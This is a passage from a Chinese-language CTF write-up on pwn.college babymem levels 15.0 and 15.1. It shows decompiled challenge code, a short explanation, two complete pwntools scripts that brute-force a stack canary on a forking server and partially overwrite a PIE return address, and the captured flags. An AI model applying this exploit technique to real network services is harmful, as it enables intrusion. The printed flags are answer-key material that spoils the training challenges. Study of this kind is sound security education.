  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 106);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win_authed() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)buf + 8,
    106);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 106);
  puts("and 8 that will overwrite the return address).\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  puts("While canaries are enabled, this networked program forks.");
  puts("What is important to note is that the canary does not get re-randomized on fork.\n");
  puts("When data that you are overflowing into is critical (i.e., if you screw it up");
  puts("the program crashes), but also static across executions, you can brute-force");
  puts("it byte by byte over many attempts.\n");
  puts("So, let's brute-force the canary!");
  puts("If this is your first time running this program, all you know so far is that");
  puts("the canary has a 0 as its left-most byte.");
  puts("You should proceed like this:\n");
  puts("- First, you should try overflowing just the null byte of the canary, for");
  printf("  practice. The canary starts at %p, which is %d bytes after the\n", (const void *)cp_, cp_ - (_DWORD)buf);
  printf("  start of your buffer. Thus, you should provide %d characters followed\n", cp_ - (_DWORD)buf);
  puts("  by a NULL byte, make sure the canary check passes, then try a non-NULL");
  puts("  byte and make sure the canary check fails. This will confirm the offsets.");
  puts("- Next try each possible value for just the next byte. One of them (the same");
  puts("  as whatever was there in memory already) will keep the canary intact, and");
  puts("  when the canary check succeeds, you know you have found the correct one.");
  puts("- Go on to the next byte, leak it the same way, and so on, until you have");
  puts("  the whole canary.\n");
  puts("You will likely want to script this process! Each byte might take up to 256");
  puts("tries to guess..\n");
  puts("Because the binary is position independent, you cannot know");
  puts("exactly where the win_authed() function is located.");
  puts("This means that it is not clear what should be written into the return address.\n");
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 106);
  printf("Of these, you will overwrite %d bytes into the return address.\n", nbytes + (_DWORD)buf - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("Overwriting the entire return address is fine when we know");
  puts("the whole address, but here, we only really know the last three nibbles.");
  puts("These nibbles never change, because pages are aligned to 0x1000.");
  puts("This gives us a workaround: we can overwrite the least significant byte");
  puts("of the saved return address, which we can know from debugging the binary,");
  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
  puts("Since that last byte will be constant between executions (due to page alignment),");
  puts("this will always work.");
  puts("If the address we want to redirect execution to is a bit farther away from");
  puts("the saved return address, and we need to write two bytes, then one of those");
  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
  puts("incorrect 15 of 16 times.");
  puts("This is okay: we can just run our exploit a few times until it works");
  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
  puts("One caveat in this challenge is that the win_authed() function must first auth:");
  puts("it only lets you win if you provide it with the argument 0x1337.");
  puts("Speifically, the win_authed() function looks something like:");
  puts("    void win_authed(int token)");
  puts("    {");
  puts("      if (token != 0x1337) return;");
  puts("      puts(\"You win! Here is your flag: \");");
  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
  puts("      puts(\"\");");
  puts("    }");
  puts(byte_43BB);
  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
  puts("but for now, we will simply bypass it! You can overwrite the return address");
  puts("with *any* value (as long as it points to executable code), not just the start");
  puts("of functions. Let's overwrite past the token check in win!\n");
  puts("To do this, we will need to analyze the program with objdump, identify where");
  puts("the check is in the win_authed() function, find the address right after the check,");
  puts("and write that address over the saved return address.\n");
  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
  printf(
    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
    (const void *)rp_,
    rp_ - (_DWORD)buf);
  puts("with the correct value.\n");
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of win_authed() is %p.\n", win_authed);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win_authed() when it returns.");
  printf("Let's try it now!\n\n");
  if ( (unsigned __int64)buf + v8 > rp_ + 2 )
  {
    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
    puts("         This can still work, because I told you the correct address to use for");
    puts("         this execution, but you should not rely on that information.");
    puts("         You can solve this challenge by only overwriting two bytes!");
    puts("         ");
  }
  puts("Goodbye!");
  return 0LL;
}
```

这个 `challenge` 也没啥好说的，存在一个栈溢出。

因为我们的子进程都是由主进程生成的，所以每个子进程都会持有和主进程相同的 canary 值。利用这点加上栈溢出漏洞，我们可以爆破 canary。这是个 64-bits 程序，我们实际只要爆破 56-bits，所以爆破时间不会很长。

把 canary 爆出来后，就可以去快乐的覆盖返回地址了。因为有 PIE 保护，所以我们还得猜倒数第四个 nibble，不过我相信这对你来说也是一件很轻松的事情～

## Exploit

```python
#!/usr/bin/python3

import os
import subprocess
import time

import psutil
from pwn import ELF, context, gdb, log, pause, process, random, remote, sleep

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-15-0"
HOST, PORT = "localhost", 1337

gdbscript = """
set follow-fork-mode child
b *challenge+1807
c
"""


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def get_forked_pid(parent_pid):
    parent = psutil.Process(parent_pid)
    children = parent.children()

    log.success(f"Parent process: {parent_pid} -> Found children: {children}")
    if len(children) != 1:
        raise Exception(f"Expected 1 child process, found {len(children)}")
    return children[0].pid


def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)

        if debug:
            if attach:
                with open(os.devnull, "w") as fnull:
                    subprocess.Popen(
                        [context.terminal[0], "-e", "nc", "localhost", "1337"],
                        stderr=fnull,
                    )
                    sleep(3)

                child_pid = get_forked_pid(target.pid)
                gdb.attach(target=child_pid, gdbscript=gdbscript)

                return remote(HOST, PORT)
            else:
                target.close()

                return gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding_to_canary = b"".ljust(0x78, b"A")
padding_to_ret = b"".ljust(0x8, b"A")
fixed_offset = b"\x6b"
possible_bytes = [bytes([i]) for i in range(0xD, 0x10D, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def brute_force_canary():
    canary = b"\x00"
    start_time = time.time()

    log.progress("Brute-forcing the canary...")

    while len(canary) < 0x8:
        for byte in range(0x0, 0xFF):
            with remote(HOST, PORT) as target:
                send_payload(target, padding_to_canary + canary + bytes([byte]))

                response = target.recvall(timeout=5)

                if b"*** stack smashing detected ***" not in response:
                    canary += bytes([byte])
                    break

    end_time = time.time()
    elapsed_time = end_time - start_time

    log.success(
        f"Canary brute-forced: {to_hex_bytes(canary)} in {elapsed_time:.2f} seconds"
    )
    sleep(1)

    return canary


def construct_payload(canary):
    payload = padding_to_canary
    payload += canary
    payload += padding_to_ret
    payload += fixed_offset + random.choice(possible_bytes)

    return payload


def attack(payload):
    try:
        with remote(HOST, PORT) as target:
            send_payload(target, payload)

            response = target.recvall(timeout=5)

            return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    launch()
    canary = brute_force_canary()

    while True:
        try:
            payload = construct_payload(canary)

            if attack(payload):
                log.success("Success! Exiting...")

                pause()
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main loop: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{MiU_dCA8jccj_TYZgFn1iejPdTj.01NxMDL5cTNxgzW}`

# Level 15.1

## Information

- Category: Pwn

## Description

> Defeat a stack canary in a PIE binary by utilizing a network-style fork server in the target binary.

## Write-up

不用讲吧，思路见上题。

## Exploit

```python
#!/usr/bin/python3

import os
import subprocess
import time

import psutil
from pwn import ELF, context, gdb, log, pause, process, random, remote, sleep

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-15-1"
HOST, PORT = "localhost", 1337

gdbscript = """
set follow-fork-mode child
b *challenge+213
c
"""


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def get_forked_pid(parent_pid):
    parent = psutil.Process(parent_pid)
    children = parent.children()

    log.success(f"Parent process: {parent_pid} -> Found children: {children}")
    if len(children) != 1:
        raise Exception(f"Expected 1 child process, found {len(children)}")
    return children[0].pid


def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)

        if debug:
            if attach:
                with open(os.devnull, "w") as fnull:
                    subprocess.Popen(
                        [context.terminal[0], "-e", "nc", "localhost", "1337"],
                        stderr=fnull,
                    )
                    sleep(3)

                child_pid = get_forked_pid(target.pid)
                gdb.attach(target=child_pid, gdbscript=gdbscript)

                return remote(HOST, PORT)
            else:
                target.close()

                return gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding_to_canary = b"".ljust(0x48, b"A")
padding_to_ret = b"".ljust(0x8, b"A")
fixed_offset = b"\xcd"
possible_bytes = [bytes([i]) for i in range(0x5, 0x105, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()

        target.sendlineafter(b"Payload size: ", payload_size)
        target.sendafter(b"Send your payload", payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def brute_force_canary():
    canary = b"\x00"
    start_time = time.time()

    while len(canary) < 0x8:
        for byte in range(0x0, 0xFF):
            with remote(HOST, PORT) as target:
                log.progress("Brute-forcing the canary...")
                send_payload(target, padding_to_canary + canary + bytes([byte]))

                response = target.recvall(timeout=5)

                if b"*** stack smashing detected ***" not in response:
                    canary += bytes([byte])
                    break

    end_time = time.time()
    elapsed_time = end_time - start_time

    log.success(
        f"Canary brute-forced: {to_hex_bytes(canary)} in {elapsed_time:.2f} seconds"
    )
    sleep(1)

    return canary


def construct_payload(canary):
    payload = padding_to_canary
    payload += canary
    payload += padding_to_ret
    payload += fixed_offset + random.choice(possible_bytes)

    return payload


def attack(payload):
    try:
        with remote(HOST, PORT) as target:
            send_payload(target, payload)

            response = target.recvall(timeout=5)

            return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    launch()
    canary = brute_force_canary()

    while True:
        try:
            payload = construct_payload(canary)

            if attack(payload):
                log.success("Success! Exiting...")

                pause()
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main loop: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{8C2ZHb8LE-O7bRe0DvQeo4_5XUV.0FOxMDL5cTNxgzW}`

# 后记

`pwn.college` 的题目质量没得说，我感觉很棒。打完这 30 题一共花了我 18 天，感觉挺慢的，但算了一下天数好像也没花太久吧哈哈哈。那么，下一站，**Shellcode Injection**！

马上就放寒假了，不知道我能在下次开学前达到什么水平呢 _>w<_

让我们拭目以待。

~_唉，寒假还得准备英语等级考试，爷的时间啊！:sob:_~

~_话说，如果你不写后记，你一定不知道写后记有多爽 bushi_~

~**_Alr, right now, let's sleep!_**~ **_Let's liberate~_**
